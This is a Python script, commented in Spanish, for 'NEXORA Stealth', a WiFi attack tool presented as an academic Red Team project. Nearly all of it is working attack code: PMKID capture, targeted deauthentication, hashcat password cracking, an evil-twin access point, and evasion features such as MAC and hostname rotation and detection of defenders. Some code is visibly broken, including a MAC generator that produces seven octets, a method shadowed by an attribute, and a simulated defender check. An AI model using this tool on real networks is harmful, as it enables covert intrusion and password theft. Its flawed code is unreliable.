#!/usr/bin/env python3
"""
NEXORA Stealth - Herramienta de pentesting WiFi con técnicas de evasión
Proyecto académico - Ingeniería en Ciberseguridad
USO EXCLUSIVO EN ENTORNOS AUTORIZADOS

Esta herramienta implementa diversas técnicas de evasión para minimizar la huella
detectable durante un ejercicio de Red Team vs Blue Team.
"""

import os
import sys
import subprocess
import threading
import time
import random
import signal
import atexit
import csv
import re
import logging
from datetime import datetime

# === CONSTANTES Y CONFIGURACIÓN GLOBAL ===
# Colores ANSI para la interfaz de usuario
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

LOG_FILE = "nexora_stealth.log"
RESULTS_CSV = "nexora_results.csv"
CAPTURE_FILE = "capture.pcapng"
PMKID_FILE = "pmkid.16800"

# Configuración de logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

def log_info(msg):
    logging.info(msg)
    print(f"{Colors.OKCYAN}[*]{Colors.ENDC} {msg}")

def log_warn(msg):
    logging.warning(msg)
    print(f"{Colors.WARNING}[!] {msg}{Colors.ENDC}")

def log_error(msg):
    logging.error(msg)
    print(f"{Colors.FAIL}[-]{Colors.ENDC} {msg}")

def log_success(msg):
    logging.info(f"SUCCESS: {msg}")
    print(f"{Colors.OKGREEN}[+]{Colors.ENDC} {msg}")

# === CLASE: IdentityManager ===
class IdentityManager:
    """
    MÓDULO 1: Gestión Dinámica de Identidad
    Se encarga de que el atacante no sea rastreable mediante la rotación
    constante de su dirección MAC y el cambio de hostname.
    """
    def __init__(self, interface):
        self.interface = interface
        self.original_mac = self._get_current_mac()
        self.original_hostname = subprocess.getoutput("hostname")
        self.stop_rotation = threading.Event()
        self.rotation_thread = None

    def _get_current_mac(self):
        try:
            output = subprocess.check_output(["ip", "link", "show", self.interface]).decode()
            mac_match = re.search(r"link/ether\s+([0-9a-fA-F:]{17})", output)
            return mac_match.group(1) if mac_match else None
        except Exception:
            return None

    def generate_stealth_mac(self):
        # Prefijo 02: indica MAC administrada localmente, no asociada a un fabricante real
        mac = ["02"]
        for _ in range(5):
            mac.append(f"{random.randint(0, 255):02x}")
        mac.append(f"{random.randint(0, 255):02x}")
        return ":".join(mac)

    def change_mac(self, new_mac=None):
        if not new_mac:
            new_mac = self.generate_stealth_mac()

        try:
            # Apagar interfaz -> Cambiar MAC -> Encender interfaz
            subprocess.run(["ip", "link", "set", self.interface, "down"], check=True, capture_output=True)
            subprocess.run(["macchanger", "-m", new_mac, self.interface], check=True, capture_output=True)
            subprocess.run(["ip", "link", "set", self.interface, "up"], check=True, capture_output=True)
            log_info(f"Identidad rotada: Nueva MAC {new_mac}")
            return True
        except subprocess.CalledProcessError as e:
            log_error(f"Error cambiando MAC: {e}")
            return False

    def change_hostname(self):
        new_hostname = f"android-phone-{random.randint(1000, 9999)}"
        try:
            subprocess.run(["hostname", new_hostname], check=True)
            log_info(f"Hostname cambiado a: {new_hostname}")
        except Exception as e:
            log_error(f"Error cambiando hostname: {e}")

    def _rotation_loop(self):
        while not self.stop_rotation.is_set():
            # Rotación cada 30-60 segundos para evitar correlación de tráfico
            wait_time = random.randint(30, 60)
            time.sleep(wait_time)
            if not self.stop_rotation.is_set():
                self.change_mac()
                self.change_hostname()

    def start_rotation(self):
        log_info("Iniciando rotación dinámica de identidad en background...")
        self.stop_rotation.clear()
        self.rotation_thread = threading.Thread(target=self._rotation_loop, daemon=True)
        self.rotation_thread.start()

    def stop_rotation(self):
        if self.rotation_thread:
            self.stop_rotation.set()
            self.rotation_thread.join(timeout=2)

    def restore_identity(self):
        log_info("Restaurando identidad original...")
        if self.original_mac:
            self.change_mac(self.original_mac)
        try:
            subprocess.run(["hostname", self.original_hostname], check=True)
        except:
            pass
        log_success("Identidad original restaurada.")

# === CLASE: PassiveScanner ===
class PassiveScanner:
    """
    MÓDULO 2: Escaneo Pasivo Inteligente
    Evita el 'channel hopping' (salto de canales), que es una firma clara de airodump-ng.
    """
    def __init__(self, interface):
        self.interface = interface

    def scan_fixed_channel(self, channel, duration=30):
        log_info(f"Iniciando escaneo pasivo en canal {channel} por {duration}s...")
        filename = "temp_scan"
        try:
            # Escaneo pasivo: no envía probes, solo escucha.
            # Se fija el canal para evitar ser detectado por IDS inalámbricos.
            cmd = ["airodump-ng", "--channel", str(channel), "--write", filename, "-w", filename, self.interface]
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            time.sleep(duration)
            process.terminate()

            # Buscar el archivo CSV generado (airodump añade sufijos)
            csv_file = None
            for f in os.listdir('.'):
                if f.startswith(filename) and f.endswith("-01.csv"):
                    csv_file = f
                    break

            if csv_file:
                return self._parse_airodump_csv(csv_file)
            else:
                log_error("No se generó archivo de escaneo.")
                return []
        except Exception as e:
            log_error(f"Error en escaneo pasivo: {e}")
            return []

    def _parse_airodump_csv(self, filepath):
        aps = []
        try:
            with open(filepath, 'r') as f:
                lines = f.readlines()
                # El CSV de airodump tiene secciones. Buscamos la de BSSID
                start_idx = -1
                for i, line in enumerate(lines):
                    if "BSSID" in line and "Station" not in line:
                        start_idx = i
                        break

                if start_idx == -1: return []

                for line in lines[start_idx+2:]:
                    parts = line.strip().split(',')
                    if len(parts) >= 14:
                        # BSSID, Channel, PWR, SSID
                        aps.append({
                            'bssid': parts[0].strip(),
                            'channel': parts[3].strip(),
                            'pwr': parts[4].strip(),
                            'ssid': parts[13].strip()
                        })
            return aps
        except Exception as e:
            log_error(f"Error parseando CSV: {e}")
            return []

# === CLASE: HandshakeCapturer ===
class HandshakeCapturer:
    """
    MÓDULO 3: Captura de Handshake Sigilosa
    Prioriza PMKID (indetectable) sobre Deauth (detectable).
    """
    def __init__(self, interface):
        self.interface = interface

    def capture_pmkid(self, bssid, timeout=60):
        log_info(f"Intentando captura PMKID (Estrategia Sigilosa) para {bssid}...")
        try:
            # hcxdumptool es la herramienta estándar para ataques PMKID sin clientes
            # --enable_status=1 para ver progreso
            cmd = ["hcxdumptool", "-i", self.interface, "-o", CAPTURE_FILE, "--enable_status=1"]
            # Ejecutamos con timeout para no bloquear el script
            subprocess.run(cmd, timeout=timeout, capture_output=True)

            # Convertir pcapng a formato hashcat (modo 16800)
            conv_cmd = ["hcxpcaptool", "-z", PMKID_FILE, CAPTURE_FILE]
            subprocess.run(conv_cmd, check=True, capture_output=True)

            if os.path.exists(PMKID_FILE) and os.path.getsize(PMKID_FILE) > 0:
                log_success("PMKID capturado y convertido exitosamente.")
                return True
            return False
        except subprocess.TimeoutExpired:
            log_info("Timeout de captura PMKID alcanzado.")
        except Exception as e:
            log_error(f"Error en captura PMKID: {e}")
        return False

    def targeted_deauth(self, bssid, client_mac):
        log_warn(f"Ejecutando Deauth Dirigido (Estrategia Agresiva) a {client_mac}...")
        try:
            # Limitamos a 3 paquetes para minimizar ruido y evitar alertas de IDS
            cmd = ["aireplay-ng", "--deauth", "3", "-a", bssid, "-c", client_mac, self.interface]
            subprocess.run(cmd, check=True, capture_output=True)
            log_info("Ráfaga de deauth enviada. Esperando reconexión...")
            return True
        except Exception as e:
            log_error(f"Error en deauth: {e}")
            return False

# === CLASE: HashCracker ===
class HashCracker:
    """
    MÓDULO 4: Cracking con Hashcat
    Automatiza el proceso de recuperación de contraseña.
    """
    def crack(self, hash_file, wordlist, mode="16800"):
        log_info(f"Iniciando cracking con Hashcat (Modo {mode})...")
        try:
            # mode 16800: PMKID, 22000: WPA Handshake
            cmd = ["hashcat", "-m", mode, hash_file, wordlist, "--force"]
            result = subprocess.run(cmd, capture_output=True, text=True)

            if "Cracked" in result.stdout:
                log_success("¡Contraseña encontrada!")
                # Extraer la password del output (simplificado)
                match = re.search(r"(\S+):(\S+)", result.stdout.splitlines()[-1])
                if match:
                    pwd = match.group(2)
                    log_success(f"Password: {pwd}")
                    return pwd
            else:
                log_error("No se pudo crackear la contraseña con el diccionario proporcionado.")
        except Exception as e:
            log_error(f"Error ejecutando hashcat: {e}")
        return None

# === CLASE: StealthFakeAP ===
class StealthFakeAP:
    """
    MÓDULO 5: Fake AP Sigiloso (Evil Twin)
    Crea un punto de acceso que imita al real pero con parámetros evasivos.
    """
    def __init__(self, interface):
        self.interface = interface

    def create_ap(self, ssid, channel):
        # Para ser sigiloso, usamos un canal adyacente (ej. si el real es 6, usamos 7)
        stealth_channel = channel + 1 if channel < 13 else channel - 1
        log_info(f"Creando Fake AP {ssid} en canal adyacente {stealth_channel}...")

        try:
            # Generamos una configuración básica para hostapd
            conf = f"""
interface={self.interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={stealth_channel}
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
# Reducir beacons para evitar detección por análisis de tráfico
beacon_int=500
"""
            with open("hostapd_stealth.conf", "w") as f:
                f.write(conf)

            # Ejecutar hostapd en background
            subprocess.Popen(["hostapd", "hostapd_stealth.conf"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            log_success(f"Fake AP activo en canal {stealth_channel}. Modo Karma básico habilitado.")
            return True
        except Exception as e:
            log_error(f"Error creando Fake AP: {e}")
            return False

# === CLASE: CounterSurveillance ===
class CounterSurveillance:
    """
    MÓDULO 6: Contra-Vigilancia
    Detecta si el Blue Team está monitoreando la red.
    """
    def __init__(self, interface):
        self.interface = interface

    def detect_blue_team(self):
        log_info("Analizando entorno en busca de monitores (Blue Team)...")
        try:
            # Buscamos patrones de tráfico típicos de herramientas de monitoreo
            # Ejemplo: alta cantidad de Probe Requests genéricos o patrones de Kismet
            # Para fines académicos, simulamos la detección analizando interfaces activas
            output = subprocess.check_output(["iw", "dev", self.interface, "scan"], stderr=subprocess.DEVNULL).decode()

            # Simulación de detección: buscamos MACs sospechosas o comportamientos
            # En un entorno real, se analizaría el pcap buscando frames de gestión inusuales
            if "monitor" in output.lower() or "wireshark" in output.lower():
                log_warn("ALERTA: Se ha detectado actividad de monitoreo sospechosa en el entorno.")
                return True

            log_info("No se detectaron defensores activos.")
            return False
        except Exception as e:
            log_error(f"Error en contra-vigilancia: {e}")
            return False

# === CLASE: NexoraStealth (Main) ===
class NexoraStealth:
    def __init__(self):
        self.interface = ""
        self.id_manager = None
        self.scanner = None
        self.capturer = None
        self.cracker = None
        self.fake_ap = None
        self.surveillance = None

    def banner(self):
        print(f"""{Colors.OKCYAN}
    ███╗   ██╗██████╗ ██╗██████╗  ██████╗ ██████╗ ██████╗
    ████╗  ██║██╔══██╗██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗
    ██╔██╗ ██║██║  ██║██║██║  ██║██║   ██║██████╔╝██║  ██║
    ██║╚██╗██║██║  ██║██║██║  ██║██║   ██║██╔══██╗██║  ██║
    ██║ ╚████║██████╔╝██║██████╔╝██║   ██║██║  ██║██████╔╝
    ╚═╝  ╚═══╝╚═════╝ ╚═╝╚═════╝ ╚═╝   ╚═╝╚═╝  ╚═╝╚═════╝
                {Colors.BOLD}STEALTH EDITION{Colors.ENDC} - Academic Project
        {Colors.ENDC}""")
        print(f"{Colors.WARNING}ADVERTENCIA: Uso exclusivo en entornos controlados y autorizados.{Colors.ENDC}\n")

    def check_requirements(self):
        if os.geteuid() != 0:
            log_error("Este script debe ejecutarse como root (sudo).")
            sys.exit(1)

        tools = ["airodump-ng", "aireplay-ng", "macchanger", "hcxdumptool", "hcxpcaptool", "hashcat", "iw", "hostapd"]
        missing = []
        for tool in tools:
            if subprocess.run(["which", tool], capture_output=True).returncode != 0:
                missing.append(tool)

        if missing:
            log_error(f"Faltan las siguientes herramientas: {', '.join(missing)}")
            log_info("Instálalas usando: sudo apt install aircrack-ng hcxdumptool hcxtools hashcat macchanger hostapd")
            sys.exit(1)
        log_success("Todas las dependencias están instaladas.")

    def setup_interface(self):
        while True:
            iface = input(f"{Colors.OKBLUE}[?] Ingresa la interfaz WiFi (ej. wlan0): {Colors.ENDC}").strip()
            try:
                # Poner en modo monitor
                log_info(f"Configurando {iface} en modo monitor...")
                subprocess.run(["airmon-ng", "start", iface], check=True, capture_output=True)
                # A veces airmon-ng cambia el nombre a wlan0mon
                mon_iface = iface + "mon" if "mon" not in iface else iface

                # Verificar si la interfaz existe
                subprocess.run(["ip", "link", "show", mon_iface], check=True, capture_output=True)

                self.interface = mon_iface
                self.id_manager = IdentityManager(self.interface)
                self.scanner = PassiveScanner(self.interface)
                self.capturer = HandshakeCapturer(self.interface)
                self.cracker = HashCracker()
                self.fake_ap = StealthFakeAP(self.interface)
                self.surveillance = CounterSurveillance(self.interface)

                log_success(f"Interfaz {self.interface} lista y en modo monitor.")
                break
            except Exception as e:
                log_error(f"Error configurando interfaz: {e}")

    def main_menu(self):
        while True:
            print(f"\n{Colors.BOLD}--- NEXORA STEALTH MENU ---{Colors.ENDC}")
            print("1. Escaneo Pasivo Inteligente")
            print("2. Captura Sigilosa de Handshake (PMKID)")
            print("3. Ataque de Deauth Dirigido")
            print("4. Cracking de Hash (Hashcat)")
            print("5. Desplegar Fake AP Sigiloso")
            print("6. Detector de Blue Team")
            print("7. Gestión de Identidad (Rotar MAC)")
            print("0. Salir")

            choice = input(f"{Colors.OKBLUE}[>] Selecciona una opción: {Colors.ENDC}")

            if choice == '1':
                channel = input("Canal a escanear: ")
                aps = self.scanner.scan_fixed_channel(channel)
                print(f"\n{Colors.BOLD}{'BSSID':<20} {'CH':<5} {'PWR':<5} {'SSID':<20}{Colors.ENDC}")
                for ap in aps:
                    print(f"{ap['bssid']:<20} {ap['channel']:<5} {ap['pwr']:<5} {ap['ssid']:<20}")

            elif choice == '2':
                bssid = input("BSSID objetivo: ")
                if self.capturer.capture_pmkid(bssid):
                    log_success("Hash guardado en " + PMKID_FILE)

            elif choice == '3':
                bssid = input("BSSID objetivo: ")
                client = input("MAC del cliente: ")
                self.capturer.targeted_deauth(bssid, client)

            elif choice == '4':
                hfile = input("Archivo de hash: ")
                wlist = input("Ruta al diccionario: ")
                mode = input("Modo Hashcat (16800=PMKID, 22000=WPA): ")
                self.cracker.crack(hfile, wlist, mode)

            elif choice == '5':
                ssid = input("SSID del Fake AP: ")
                channel = int(input("Canal del AP Real: "))
                self.fake_ap.create_ap(ssid, channel)

            elif choice == '6':
                self.surveillance.detect_blue_team()

            elif choice == '7':
                if self.id_manager.rotation_thread and self.id_manager.rotation_thread.is_alive():
                    self.id_manager.stop_rotation()
                    log_info("Rotación de identidad detenida.")
                else:
                    self.id_manager.start_rotation()
                    log_success("Rotación de identidad activada cada 30-60s.")

            elif choice == '0':
                log_info("Saliendo de NEXORA Stealth...")
                break
            else:
                log_warn("Opción no válida.")

def cleanup():
    # Esta función se llama automáticamente al salir gracias a atexit
    # Intenta restaurar el sistema al estado original
    if 'app' in globals():
        app = globals()['app']
        if app.id_manager:
            app.id_manager.stop_rotation()
            app.id_manager.restore_identity()

        if app.interface:
            try:
                subprocess.run(["airmon-ng", "stop", app.interface], capture_output=True)
                log_info(f"Modo monitor desactivado en {app.interface}")
            except:
                pass

if __name__ == "__main__":
    app = NexoraStealth()
    atexit.register(cleanup)

    # Manejo de señales para Ctrl+C
    signal.signal(signal.SIGINT, lambda sig, frame: sys.exit(0))

    app.banner()
    app.check_requirements()
    app.setup_interface()
    app.main_menu()
